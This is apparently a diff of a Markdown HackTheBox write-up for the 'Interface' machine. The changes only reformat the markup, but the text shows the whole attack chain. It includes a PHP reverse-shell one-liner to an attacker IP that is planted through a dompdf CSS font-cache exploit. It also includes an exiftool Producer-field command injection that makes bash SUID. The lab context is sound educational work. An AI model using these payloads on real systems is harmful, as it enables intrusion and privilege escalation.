@@ -21,13 +21,12 @@ We can add `interface.htb` to our `/etc/hosts` file.
 
 The web application reveals this:
 
-<figure><img src="../../../.gitbook/assets/image (3457).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3457).png>)
 
 We can start with a simple `gobuster` scan to enumerate the possible endpoints in both directories and subdomains. However, the weird part is that there was nothing to be found from these.
 
 We can try to see the HTTP requests that are being sent and received using Burpsuite. When sending a GET request, this is what we see in return:
 
-{% code overflow="wrap" %}
 ```http
 HTTP/1.1 304 Not Modified
 Server: nginx/1.14.0 (Ubuntu)
@@ -37,7 +36,6 @@ Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: h
 X-Powered-By: Next.js
 ETag: "i8ubiadkff4wf"
 ```
-{% endcode %}
 
 There was a Content-Security-Policy (CSP), which is something I don't see often on HTB. Specifically, we can see that the `unsafe-inline` and `unsafe-eval` options are set. This is a security misconfiguration that is probably the foothold.
 
@@ -90,15 +88,13 @@ Some JSON was returned, and there's mentionf of a 'route not defined' error.
 
 I ran another `gobuster` search with a larger wordlist and the `php,html,txt` extensions to fully find all the stuff I can, and still found nothing. Only when I ran a `ffuf` scan using POST requests, did I find one interesting `/api/html2pdf` endpoint.
 
-{% code overflow="wrap" %}
 ```bash
 $ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50
 
 html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 13ms]
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (3820).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3820).png>)
 
 I did the same scan on the `/vendor` endpoint and found this:
 
@@ -120,19 +116,16 @@ The PoC states that by creating a CSS file that redirects the server to a PHP fi
 
 Now, we need to find out how to send HTML data into that API. Based on the PoC, we should be sending some HTML frames into this API. After some testing, it seems that the variable is `html`.
 
-<figure><img src="../../../.gitbook/assets/image (1820).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1820).png>)
 
 Now we can attempt to gain a shell. First, we need to create a PHP reverse shell one-liner and a malicious CSS file, then host them both on a Python HTTP server (hosting them on a PHP server does not work for some reason).
 
 Take note that the PHP file has to be a legit CSS file, and we just need to change the extension to PHP. We can grab such a file from the Github PoC link I put earlier.  Then, we can use `vim` to write this extra line:
 
-{% code title="exploit_font.php" %}
 ```php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'");?>
 ```
-{% endcode %}
 
-{% code title="exploit.css" %}
 ```css
 @font-face{
         font-family:'DejaVuSerif';
@@ -141,7 +134,6 @@ Take note that the PHP file has to be a legit CSS file, and we just need to chan
         font-style:'normal';
 }
 ```
-{% endcode %}
 
 Then, we need to find the SHA1 hash of the link to our server, in this case mine is `http://10.10.14.22/exploit_font.php`, which becomes `a9e48a0532165b117a0ca8132955581e`.
 
@@ -173,7 +165,7 @@ On the machine, our file is now saved in the fonts directory as `exploitfont_nor
 
 This would give us a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(352).png>)
 
 We can capture the user flag from this.
 
@@ -213,13 +205,13 @@ done
 
 This is running Exiftool 12.55, which does not have any glaring RCE exploits. The command run seems to only print out the Producer field from a file.
 
-<figure><img src="../../../.gitbook/assets/image (3521).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3521).png>)
 
 From this, we have to somehow include a reverse shell or something using escape characters. I notice that the Producer variable within the exiftool output is unquoted.
 
 In Bash, a single quote would treat all characters within the quotes as strings and not process it. If it is in double quotes, **variables and expressions will be processed.**
 
-<figure><img src="../../../.gitbook/assets/image (3348).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3348).png>)
 
 So, in this case, we need to find a way to inject commands into the Producer variable in Bash. Here are some resources I've found when researching this:
 
@@ -237,18 +229,16 @@ Linux
 
 The Producer field of this file is the vulnerability here. I tested this out on my machine, and it works.
 
-<figure><img src="../../../.gitbook/assets/image (2795).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2795).png>)
 
 Now, we can exploit this by creating a simple PE bash script to make `/bin/bash` an SUID binary. Then, we can change the Producer field to make the machine execute our script.
 
-{% code overflow="wrap" %}
 ```bash
 /usr/bin/exiftool -Producer="a[0\$(/dev/shm/pe.sh>&2)]" /tmp/sample.png
 ```
-{% endcode %}
 
 Then, we wait till it executes our script.
 
-<figure><img src="../../../.gitbook/assets/image (2491).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2491).png>)
 
 Interesting foothold, weird enumeration and really interesting PE through the unquoted variables.
